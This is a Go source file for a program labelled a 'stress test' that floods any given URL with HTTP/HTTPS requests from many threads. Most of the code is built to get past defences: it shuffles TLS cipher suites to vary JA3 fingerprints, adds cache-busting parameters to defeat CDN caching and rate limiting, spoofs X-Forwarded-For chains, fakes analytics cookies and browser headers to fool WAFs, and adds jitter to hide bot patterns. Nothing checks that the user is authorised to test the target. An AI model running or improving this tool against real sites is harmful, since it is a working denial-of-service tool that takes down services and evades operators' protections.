// Direct stress test (no proxy).
package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"log/slog"
	"math/rand/v2"
	"net"
	"net/url"
	"os"
	"os/signal"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// ─── Config ───────────────────────────────────────────────────────────────────

type StressConfig struct {
	Target     *url.URL
	Threads    int
	Duration   time.Duration
	CustomHost string
	Port       int
	Path       string
	ProxyType  string
	Proxies    []string
	JitterMs   int // max per-request jitter in milliseconds (0 = disabled)
}

// ─── HTTP helpers ─────────────────────────────────────────────────────────────

var (
	// GET is 3× more likely than POST or HEAD.
	httpMethods = []string{"GET", "GET", "GET", "POST", "HEAD"}

	contentTypes = []string{
		"application/x-www-form-urlencoded",
		"application/json",
		"text/plain",
	}

	languages = []string{
		"en-US,en;q=0.9",
		"en-US,en;q=0.9,fr;q=0.5",
		"en-GB,en;q=0.8",
		"fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
		"de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
		"es-ES,es;q=0.9,en;q=0.8",
		"pt-BR,pt;q=0.9,en-US;q=0.8",
		"ja-JP,ja;q=0.9,en-US;q=0.8",
		"zh-CN,zh;q=0.9,en;q=0.8",
		"ko-KR,ko;q=0.9,en-US;q=0.8",
		"ru-RU,ru;q=0.9,en-US;q=0.8",
		"tr-TR,tr;q=0.9,en-US;q=0.8",
	}

	// referers simulates real traffic sources including search engines and social media.
	// An empty string means direct navigation (no Referer header).
	referers = []string{
		"https://www.google.com/",
		"https://www.google.com/search?q=site",
		"https://www.bing.com/search?q=",
		"https://duckduckgo.com/",
		"https://www.facebook.com/",
		"https://t.co/",
		"https://www.reddit.com/",
		"https://www.youtube.com/",
		"https://www.instagram.com/",
		"https://www.linkedin.com/",
		"https://news.ycombinator.com/",
		"", // direct navigation — no Referer header
		"", // weighted: ~17% chance of no referer
	}

	// chromeCipherSuites are the TLS 1.2 cipher suites Chrome offers.
	// They are shuffled per-connection to vary the JA3 fingerprint.
	chromeCipherSuites = []uint16{
		tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
		tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
		tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_RSA_WITH_AES_128_CBC_SHA,
		tls.TLS_RSA_WITH_AES_256_CBC_SHA,
	}

	// bufPool avoids per-request header allocations.
	// IMPORTANT: buf.Bytes() must be consumed (written to conn) before Put().
	bufPool = sync.Pool{New: func() any { return new(bytes.Buffer) }}

	// bodyBufPool avoids per-request POST body allocations.
	bodyBufPool = sync.Pool{New: func() any { return new(bytes.Buffer) }}

	// Pre-generated random User-Agent strings — large pool reduces repetition.
	uaPool []string
)

func init() {
	// 500-entry pool with diverse browser/OS/mobile combinations.
	uaPool = make([]string, 500)
	for i := range uaPool {
		uaPool[i] = generateUserAgent()
	}
}

// ─── Manager ──────────────────────────────────────────────────────────────────

// Manager coordinates DNS refresh, worker lifecycle, and metrics.
// All state that was previously package-global lives here.
type Manager struct {
	cfg StressConfig

	ipsMu sync.Mutex
	ips   []string

	// rebalanceCh carries new IP slices from dnsRefresh to runManager.
	// Buffered to 1 so only the latest update is kept.
	rebalanceCh chan []string

	// Metrics
	totalReqs   atomic.Int64
	totalErrors atomic.Int64
}

func NewManager(cfg StressConfig) *Manager {
	return &Manager{
		cfg:         cfg,
		rebalanceCh: make(chan []string, 1),
	}
}

func (m *Manager) updateIPs(newIPs []string) {
	m.ipsMu.Lock()
	m.ips = newIPs
	m.ipsMu.Unlock()
}

func (m *Manager) snapshotIPs() []string {
	m.ipsMu.Lock()
	defer m.ipsMu.Unlock()
	out := make([]string, len(m.ips))
	copy(out, m.ips)
	return out
}

// ─── Entry point ──────────────────────────────────────────────────────────────

func runDirect(rawURL string, threads int, duration time.Duration, customHost string, jitterMs int) {
	parsedURL, err := url.Parse(rawURL)
	if err != nil || parsedURL.Scheme == "" || parsedURL.Hostname() == "" {
		fmt.Fprintf(os.Stderr, "Invalid URL: %q\n", rawURL)
		os.Exit(1)
	}
	if parsedURL.Scheme != "http" && parsedURL.Scheme != "https" {
		fmt.Fprintf(os.Stderr, "URL scheme must be http or https, got %q\n", parsedURL.Scheme)
		os.Exit(1)
	}

	path := parsedURL.RequestURI()
	if path == "" {
		path = "/"
	}

	cfg := StressConfig{
		Target:     parsedURL,
		Threads:    threads,
		Duration:   duration,
		CustomHost: customHost,
		Port:       determinePort(parsedURL),
		Path:       path,
		JitterMs:   jitterMs,
	}

	// Initial DNS lookup.
	addrs, err := lookupIPv4(parsedURL.Hostname())
	if err != nil {
		fmt.Fprintf(os.Stderr, "Initial DNS lookup failed: %v\n", err)
		os.Exit(1)
	}
	slog.Info("resolved IPs", "ips", addrs)

	mgr := NewManager(cfg)
	mgr.updateIPs(addrs)

	// Root context: cancelled by duration or signal.
	rootCtx, cancel := context.WithTimeout(context.Background(), cfg.Duration)
	defer cancel()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	go func() {
		select {
		case <-sigCh:
			slog.Info("interrupt received; shutting down early")
			cancel()
		case <-rootCtx.Done():
		}
	}()

	go mgr.dnsRefresh(rootCtx, parsedURL.Hostname(), 30*time.Second)
	go mgr.runStats(rootCtx, 5*time.Second)

	slog.Info("stress test starting", "url", rawURL, "threads", threads, "duration", cfg.Duration)
	mgr.runManager(rootCtx)
	slog.Info("stress test completed",
		"requests", mgr.totalReqs.Load(),
		"errors", mgr.totalErrors.Load(),
	)
}

// ─── Manager: worker lifecycle ────────────────────────────────────────────────

type workerEntry struct{ cancel context.CancelFunc }

func (m *Manager) runManager(ctx context.Context) {
	workers := make(map[string][]workerEntry)

	spawn := func(ip string) {
		wctx, wcancel := context.WithCancel(ctx)
		workers[ip] = append(workers[ip], workerEntry{cancel: wcancel})
		go m.workerLoop(wctx, ip)
	}

	m.rebalance(m.snapshotIPs(), workers, spawn)

	for {
		select {
		case <-ctx.Done():
			for _, list := range workers {
				for _, w := range list {
					w.cancel()
				}
			}
			return
		case newIPs := <-m.rebalanceCh:
			m.rebalance(newIPs, workers, spawn)
		}
	}
}

func (m *Manager) rebalance(ipsList []string, workers map[string][]workerEntry, spawn func(string)) {
	n := len(ipsList)
	if n == 0 {
		for ip, list := range workers {
			for _, w := range list {
				w.cancel()
			}
			delete(workers, ip)
		}
		slog.Warn("rebalance: no IPs available; all workers cancelled")
		return
	}

	base := m.cfg.Threads / n
	extra := m.cfg.Threads % n
	desired := make(map[string]int, n)
	for i, ip := range ipsList {
		desired[ip] = base
		if i < extra {
			desired[ip]++
		}
	}

	// Cancel workers for IPs no longer in the desired set.
	for ip, list := range workers {
		if _, ok := desired[ip]; !ok {
			for _, w := range list {
				w.cancel()
			}
			delete(workers, ip)
		}
	}

	// Spawn or cancel to hit the target count per IP.
	for ip, want := range desired {
		have := len(workers[ip])
		for i := 0; i < want-have; i++ {
			spawn(ip)
		}
		for i := 0; i < have-want; i++ {
			w := workers[ip][0]
			w.cancel()
			workers[ip] = workers[ip][1:]
		}
	}

	slog.Info("rebalance complete", "desired", desired, "running", mapCounts(workers))
}

// mapCounts is only used for debug logging; skip allocation when not needed.
func mapCounts(workers map[string][]workerEntry) map[string]int {
	out := make(map[string]int, len(workers))
	for ip, list := range workers {
		out[ip] = len(list)
	}
	return out
}

// ─── Worker ───────────────────────────────────────────────────────────────────

func (m *Manager) workerLoop(ctx context.Context, ip string) {
	hostHdr := m.cfg.Target.Hostname()
	if m.cfg.CustomHost != "" {
		hostHdr = m.cfg.CustomHost
	}

	addr := fmt.Sprintf("%s:%d", ip, m.cfg.Port)
	backoff := 50 * time.Millisecond

	for {
		if ctx.Err() != nil {
			return
		}

		// Build a fresh TLS config per-dial to shuffle cipher suites (JA3 variation).
		//nolint:gosec // InsecureSkipVerify is intentional for a stress tool
		tlsCfg := &tls.Config{
			ServerName:         hostHdr,
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
			CipherSuites:       shuffledCipherSuites(),
		}

		conn, err := dialConn(ctx, addr, tlsCfg)
		if err != nil {
			// Exponential backoff to avoid CPU spin on refused connections.
			select {
			case <-ctx.Done():
				return
			case <-time.After(backoff):
			}
			backoff = minDuration(backoff*2, 5*time.Second)
			slog.Debug("dial failed", "addr", addr, "err", err, "backoff", backoff)
			m.totalErrors.Add(1)
			continue
		}
		backoff = 50 * time.Millisecond // reset on successful dial

		method := httpMethods[rand.IntN(len(httpMethods))]

		// sendBurst returns false when the connection is dead; re-dial in that case.
	burstLoop:
		for {
			select {
			case <-ctx.Done():
				conn.Close()
				return
			default:
				alive := m.sendBurst(conn, hostHdr, method)
				if alive {
					m.totalReqs.Add(1)
					// Jitter: small random sleep between requests to avoid zero-delay bot signature.
					if m.cfg.JitterMs > 0 {
						jitter := time.Duration(rand.IntN(m.cfg.JitterMs)+1) * time.Millisecond
						select {
						case <-ctx.Done():
							conn.Close()
							return
						case <-time.After(jitter):
						}
					}
				} else {
					m.totalErrors.Add(1)
					conn.Close()
					break burstLoop
				}
			}
		}
	}
}

// ─── Request building & sending ───────────────────────────────────────────────

// sendBurst sends one HTTP request on conn and drains a small response chunk.
// Returns true if the connection is still usable, false if it should be closed and re-dialled.
func (m *Manager) sendBurst(conn net.Conn, hostHdr, method string) (alive bool) {
	buf := bufPool.Get().(*bytes.Buffer)
	buf.Reset()

	var bodyBuf *bytes.Buffer
	if method == "POST" {
		bodyBuf = bodyBufPool.Get().(*bytes.Buffer)
		bodyBuf.Reset()
	}

	buildRequest(buf, m.cfg, method, hostHdr, bodyBuf)

	// Write header (and optional body) directly from pool buffer — no intermediate copy.
	bufs := net.Buffers{buf.Bytes()}
	if method == "POST" && bodyBuf != nil && bodyBuf.Len() > 0 {
		bufs = append(bufs, bodyBuf.Bytes())
	}
	_, writeErr := bufs.WriteTo(conn)
	
	bufPool.Put(buf) // safe: buf.Bytes() has already been consumed by WriteTo
	if bodyBuf != nil {
		bodyBufPool.Put(bodyBuf)
	}

	if writeErr != nil {
		return false
	}

	// Drain a small chunk to advance the OS receive window.
	// Short deadline so slow servers don't stall the worker.
	conn.SetReadDeadline(time.Now().Add(5 * time.Millisecond))
	var tmp [1024]byte
	_, readErr := conn.Read(tmp[:])
	conn.SetReadDeadline(time.Time{})

	// If the read returns a permanent error (not a timeout), the connection is dead.
	if readErr != nil {
		if netErr, ok := readErr.(net.Error); ok && netErr.Timeout() {
			// Timeout is expected — the server may not have sent anything yet.
			return true
		}
		// Permanent error (e.g. EOF, RST) — connection is dead.
		return false
	}

	return true
}

// buildRequest writes a raw HTTP/1.1 request into buf using browser-realistic headers.
// bodyBuf is populated only for POST.
func buildRequest(buf *bytes.Buffer, cfg StressConfig, method, hostHdr string, bodyBuf *bytes.Buffer) {
	hostPort := hostHdr
	if cfg.Port != 80 && cfg.Port != 443 {
		hostPort = hostHdr + ":" + strconv.Itoa(cfg.Port)
	}

	// Determine request URI with a cache-busting parameter to defeat CDN caching
	// and prevent rate-limiting based on repeated identical request signatures.
	requestURI := cfg.Path
	if cfg.ProxyType == "http" || cfg.ProxyType == "https" {
		if cfg.Target.Scheme == "http" {
			requestURI = cfg.Target.String()
		}
	}
	if method == "GET" || method == "HEAD" {
		if strings.Contains(requestURI, "?") {
			requestURI += "&" + randomCacheBuster()
		} else {
			requestURI += "?" + randomCacheBuster()
		}
	}

	ua := randomUserAgent()
	isMobile := strings.Contains(ua, "Mobile")
	isChrome := strings.Contains(ua, "Chrome/")
	isFirefox := strings.Contains(ua, "Firefox/")

	buf.WriteString(method)
	buf.WriteByte(' ')
	buf.WriteString(requestURI)
	buf.WriteString(" HTTP/1.1\r\nHost: ")
	buf.WriteString(hostPort)
	buf.WriteString("\r\n")

	buf.WriteString("User-Agent: " + ua + "\r\n")

	// Browser-specific Accept strings (WAFs check UA ↔ Accept consistency).
	switch {
	case isFirefox:
		buf.WriteString("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n")
	case isChrome:
		buf.WriteString("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n")
	default: // Safari
		buf.WriteString("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n")
	}

	buf.WriteString("Accept-Language: " + languages[rand.IntN(len(languages))] + "\r\n")
	buf.WriteString("Accept-Encoding: gzip, deflate, br, zstd\r\n")

	// sec-ch-ua: Chrome-only client hint headers.
	if isChrome {
		cv := randomChromeVersion()
		if isMobile {
			buf.WriteString("sec-ch-ua: \"Google Chrome\";v=\"")
			buf.WriteString(cv)
			buf.WriteString("\", \"Chromium\";v=\"")
			buf.WriteString(cv)
			buf.WriteString("\", \"Not:A-Brand\";v=\"24\"\r\n")
			buf.WriteString("sec-ch-ua-mobile: ?1\r\n")
			buf.WriteString("sec-ch-ua-platform: \"Android\"\r\n")
		} else {
			buf.WriteString("sec-ch-ua: \"Google Chrome\";v=\"")
			buf.WriteString(cv)
			buf.WriteString("\", \"Chromium\";v=\"")
			buf.WriteString(cv)
			buf.WriteString("\", \"Not:A-Brand\";v=\"24\"\r\n")
			buf.WriteString("sec-ch-ua-mobile: ?0\r\n")
			buf.WriteString("sec-ch-ua-platform: \"")
			buf.WriteString(randomPlatform())
			buf.WriteString("\"\r\n")
		}
	}

	// Sec-Fetch-* headers: vary site/mode to look like diverse navigation events,
	// not a bot sending Sec-Fetch-Site: none on every single request.
	secFetchSites := []string{"none", "same-origin", "same-site", "cross-site"}
	secFetchSite := secFetchSites[rand.IntN(len(secFetchSites))]

	if isChrome || isFirefox {
		buf.WriteString("Upgrade-Insecure-Requests: 1\r\n")
		buf.WriteString("Sec-Fetch-Site: " + secFetchSite + "\r\n")
		buf.WriteString("Sec-Fetch-Mode: navigate\r\n")
		if secFetchSite == "none" || secFetchSite == "same-origin" {
			buf.WriteString("Sec-Fetch-User: ?1\r\n")
		}
		buf.WriteString("Sec-Fetch-Dest: document\r\n")
	}

	// Priority header: Chrome 115+ sends this on document navigations.
	if isChrome {
		buf.WriteString("Priority: u=0, i\r\n")
	}

	buf.WriteString("Cache-Control: no-cache, no-store\r\n")
	buf.WriteString("Pragma: no-cache\r\n")

	// X-Forwarded-For chain: simulate CDN-proxied traffic with 2-hop or 3-hop chain.
	buf.WriteString("X-Forwarded-For: ")
	buf.WriteString(randomPublicIP())
	if rand.IntN(3) > 0 { // 66% chance of multi-hop chain
		buf.WriteString(", ")
		buf.WriteString(randomCDNEdgeIP())
	}
	buf.WriteString("\r\n")

	// Cookie simulation: ~20% chance of analytics cookies (returning visitor pattern).
	if rand.IntN(5) == 0 {
		gaBase := rand.Int64N(1_999_999_999) + 1
		gaStamp := time.Now().Unix() - rand.Int64N(90*24*3600) // random visit up to 90 days ago
		gidBase := rand.Int64N(1_999_999_999) + 1
		buf.WriteString("Cookie: _ga=GA1.2.")
		buf.WriteString(strconv.FormatInt(gaBase, 10))
		buf.WriteByte('.')
		buf.WriteString(strconv.FormatInt(gaStamp, 10))
		buf.WriteString("; _gid=GA1.2.")
		buf.WriteString(strconv.FormatInt(gidBase, 10))
		buf.WriteByte('.')
		buf.WriteString(strconv.FormatInt(time.Now().Unix(), 10))
		buf.WriteString("\r\n")
	}

	// Referer: diverse sources including search engines and social media.
	// ~17% of requests have no referer (direct navigation).
	referer := referers[rand.IntN(len(referers))]
	if referer != "" {
		buf.WriteString("Referer: ")
		buf.WriteString(referer)
		buf.WriteString("\r\n")
	}

	if method == "POST" {
		ct := contentTypes[rand.IntN(len(contentTypes))]
		createBody(bodyBuf, ct)
		buf.WriteString("Content-Type: ")
		buf.WriteString(ct)
		buf.WriteString("\r\nContent-Length: ")
		buf.WriteString(strconv.Itoa(bodyBuf.Len()))
		buf.WriteString("\r\n")
		buf.WriteString("Origin: https://")
		buf.WriteString(hostHdr)
		buf.WriteString("\r\n")
	}

	buf.WriteString("Connection: keep-alive\r\n\r\n")
}

// ─── DNS ──────────────────────────────────────────────────────────────────────

func (m *Manager) dnsRefresh(ctx context.Context, host string, interval time.Duration) {
	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			addrs, err := lookupIPv4(host)
			if err != nil {
				// Log and keep using existing IPs.
				slog.Warn("DNS re-resolution failed", "host", host, "err", err)
				continue
			}
			// Only trigger rebalance if IPs actually changed.
			m.ipsMu.Lock()
			changed := !slicesEqual(m.ips, addrs)
			if changed {
				m.ips = addrs
			}
			m.ipsMu.Unlock()
			slog.Info("DNS refreshed", "host", host, "ips", addrs)
			if changed {
				select {
				case m.rebalanceCh <- addrs:
				default:
				}
			}
		}
	}
}

// slicesEqual compares two sorted string slices for equality.
func slicesEqual(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

// lookupIPv4 resolves a host to sorted IPv4 addresses.
// Returns an error if DNS fails or no IPv4 addresses are found.
func lookupIPv4(host string) ([]string, error) {
	addrs, err := net.LookupIP(host)
	if err != nil {
		return nil, err
	}
	var out []string
	for _, a := range addrs {
		if ip4 := a.To4(); ip4 != nil {
			out = append(out, ip4.String())
		}
	}
	if len(out) == 0 {
		return nil, fmt.Errorf("no IPv4 addresses found for %s", host)
	}
	sort.Strings(out) // deterministic order → stable rebalancing
	return out, nil
}

// ─── Dialling ─────────────────────────────────────────────────────────────────

// dialConn dials addr using a context-aware dialer for both TCP and TLS.
// TLS uses tls.Dialer.DialContext so the dial respects ctx cancellation.
func dialConn(ctx context.Context, addr string, tlsCfg *tls.Config) (net.Conn, error) {
	netDialer := &net.Dialer{
		Timeout:   5 * time.Second,
		KeepAlive: 30 * time.Second,
	}
	_, port, _ := net.SplitHostPort(addr)
	if port == "443" || tlsCfg != nil && strings.HasSuffix(addr, ":443") {
		// tls.Dialer.DialContext honours ctx cancellation, unlike tls.DialWithDialer.
		return (&tls.Dialer{NetDialer: netDialer, Config: tlsCfg}).DialContext(ctx, "tcp", addr)
	}
	return netDialer.DialContext(ctx, "tcp", addr)
}

// ─── Metrics ──────────────────────────────────────────────────────────────────

func (m *Manager) runStats(ctx context.Context, interval time.Duration) {
	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	var lastReqs, lastErrs int64
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			reqs := m.totalReqs.Load()
			errs := m.totalErrors.Load()
			deltaReqs := reqs - lastReqs
			deltaErrs := errs - lastErrs
			lastReqs, lastErrs = reqs, errs
			rps := float64(deltaReqs) / interval.Seconds()
			slog.Info("stats",
				"req/s", fmt.Sprintf("%.0f", rps),
				"errors", deltaErrs,
				"total_reqs", reqs,
				"total_errors", errs,
			)
		}
	}
}

// ─── Randomisation helpers ────────────────────────────────────────────────────

func randomUserAgent() string {
	return uaPool[rand.IntN(len(uaPool))]
}

// generateUserAgent produces a realistic UA from one of five browser/platform families.
func generateUserAgent() string {
	switch rand.IntN(10) {
	case 0, 1, 2, 3, 4: // 50% Chrome desktop
		return generateChromeDesktopUA()
	case 5, 6: // 20% Firefox desktop
		return generateFirefoxDesktopUA()
	case 7: // 10% Safari macOS
		return generateSafariDesktopUA()
	case 8: // 10% Chrome Android
		return generateChromeAndroidUA()
	default: // 10% Safari iOS
		return generateSafariIOSUA()
	}
}

func generateChromeDesktopUA() string {
	osList := []string{
		"Windows NT 10.0; Win64; x64",
		"Windows NT 11.0; Win64; x64",
		"Macintosh; Intel Mac OS X 10_15_7",
		"Macintosh; Intel Mac OS X 13_0_0",
		"Macintosh; Intel Mac OS X 14_0",
		"X11; Linux x86_64",
		"X11; Linux i686",
	}
	os := osList[rand.IntN(len(osList))]
	major := rand.IntN(20) + 110 // v110–v130
	build := rand.IntN(5000) + 1000
	patch := rand.IntN(200)
	return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.%d.%d Safari/537.36",
		os, major, build, patch)
}

func generateFirefoxDesktopUA() string {
	osList := []string{
		"Windows NT 10.0; Win64; x64",
		"Windows NT 11.0; Win64; x64",
		"Macintosh; Intel Mac OS X 10.15",
		"X11; Linux x86_64",
		"X11; Ubuntu; Linux x86_64",
	}
	os := osList[rand.IntN(len(osList))]
	major := rand.IntN(30) + 100 // v100–v130
	return fmt.Sprintf("Mozilla/5.0 (%s; rv:%d.0) Gecko/20100101 Firefox/%d.0", os, major, major)
}

func generateSafariDesktopUA() string {
	macVersions := []string{"10_15_7", "12_0_0", "13_0_0", "14_0", "14_1_2"}
	safariBuilds := []string{"605.1.15", "614.1", "615.1.7", "616.2.9", "617.3.11"}
	mac := macVersions[rand.IntN(len(macVersions))]
	sb := safariBuilds[rand.IntN(len(safariBuilds))]
	return fmt.Sprintf("Mozilla/5.0 (Macintosh; Intel Mac OS X %s) AppleWebKit/%s (KHTML, like Gecko) Version/16.%d Safari/%s",
		mac, sb, rand.IntN(6), sb)
}

func generateChromeAndroidUA() string {
	devices := []string{
		"Linux; Android 13; SM-G991B",
		"Linux; Android 14; Pixel 8",
		"Linux; Android 13; Pixel 7",
		"Linux; Android 12; SM-A525F",
		"Linux; Android 14; SM-S918B",
		"Linux; Android 13; CPH2197",
	}
	device := devices[rand.IntN(len(devices))]
	major := rand.IntN(15) + 115 // v115–v130
	build := rand.IntN(5000) + 1000
	patch := rand.IntN(200)
	return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.%d.%d Mobile Safari/537.36",
		device, major, build, patch)
}

func generateSafariIOSUA() string {
	versions := []string{
		"iPhone; CPU iPhone OS 16_6 like Mac OS X",
		"iPhone; CPU iPhone OS 17_0 like Mac OS X",
		"iPhone; CPU iPhone OS 17_2 like Mac OS X",
		"iPad; CPU OS 16_6 like Mac OS X",
		"iPad; CPU OS 17_0 like Mac OS X",
	}
	builds := []string{"604.1", "605.1.15", "614.1"}
	v := versions[rand.IntN(len(versions))]
	sb := builds[rand.IntN(len(builds))]
	return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/%s (KHTML, like Gecko) Version/16.%d Mobile/15E148 Safari/%s",
		v, sb, rand.IntN(6), sb)
}

func randomChromeVersion() string {
	return strconv.Itoa(rand.IntN(20) + 110) // v110–v130
}

func randomPlatform() string {
	return []string{"Windows", "macOS", "Linux"}[rand.IntN(3)]
}

// randomCacheBuster returns a random query key=value pair to defeat caching and
// prevent rate-limiting systems from collapsing repeated identical request signatures.
func randomCacheBuster() string {
	keys := []string{"_", "v", "cb", "t", "r", "nocache", "ts", "rnd"}
	return keys[rand.IntN(len(keys))] + "=" + strconv.FormatInt(rand.Int64N(1_000_000_000), 10)
}

// randomPublicIP returns a random routable IPv4 address (non-RFC1918).
func randomPublicIP() string {
	for {
		a := rand.IntN(222) + 1
		if a == 10 || a == 127 {
			continue
		}
		b := rand.IntN(256)
		if a == 172 && b >= 16 && b <= 31 {
			continue
		}
		if a == 192 && b == 168 {
			continue
		}
		return fmt.Sprintf("%d.%d.%d.%d", a, b, rand.IntN(256), rand.IntN(254)+1)
	}
}

// randomCDNEdgeIP simulates an intermediate CDN/load-balancer hop in the XFF chain.
func randomCDNEdgeIP() string {
	switch rand.IntN(3) {
	case 0:
		return fmt.Sprintf("10.%d.%d.%d", rand.IntN(256), rand.IntN(256), rand.IntN(254)+1)
	case 1:
		return fmt.Sprintf("172.%d.%d.%d", rand.IntN(16)+16, rand.IntN(256), rand.IntN(254)+1)
	default:
		return fmt.Sprintf("192.168.%d.%d", rand.IntN(256), rand.IntN(254)+1)
	}
}

// shuffledCipherSuites returns a copy of the browser cipher suite list in a randomised
// order. This varies the JA3 TLS fingerprint on each new connection.
func shuffledCipherSuites() []uint16 {
	suites := make([]uint16, len(chromeCipherSuites))
	copy(suites, chromeCipherSuites)
	rand.Shuffle(len(suites), func(i, j int) { suites[i], suites[j] = suites[j], suites[i] })
	return suites
}

func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.IntN(len(letters))]
	}
	return string(b)
}

func createBody(b *bytes.Buffer, ct string) {
	switch ct {
	case "application/x-www-form-urlencoded":
		vals := url.Values{}
		for i := 0; i < 3; i++ {
			var key, val string
			if rand.IntN(100) < 70 {
				switch rand.IntN(3) {
				case 0:
					key, val = "username", randomString(8)
				case 1:
					key = "email"
					val = fmt.Sprintf("%s@example.com", randomString(6))
				default:
					key, val = randomString(5), randomString(8)
				}
			} else {
				key, val = randomString(5), randomString(8)
			}
			vals.Set(key, val)
		}
		b.WriteString(vals.Encode())

	case "application/json":
		if rand.IntN(2) == 0 {
			fmt.Fprintf(b, `{"id":%d,"name":"%s","active":%t}`,
				rand.IntN(10000), randomString(6), rand.IntN(2) == 1)
		} else {
			b.WriteByte('{')
			for i := 0; i < 3; i++ {
				if i > 0 {
					b.WriteByte(',')
				}
				fmt.Fprintf(b, `"%s":"%s"`, randomString(5), randomString(8))
			}
			b.WriteByte('}')
		}

	default: // text/plain
		b.WriteString("text_" + randomString(12))
	}
}

// ─── Misc helpers ─────────────────────────────────────────────────────────────

func determinePort(u *url.URL) int {
	if p := u.Port(); p != "" {
		if i, err := strconv.Atoi(p); err == nil {
			return i
		}
	}
	if strings.EqualFold(u.Scheme, "https") {
		return 443
	}
	return 80
}

func minDuration(a, b time.Duration) time.Duration {
	if a < b {
		return a
	}
	return b
}
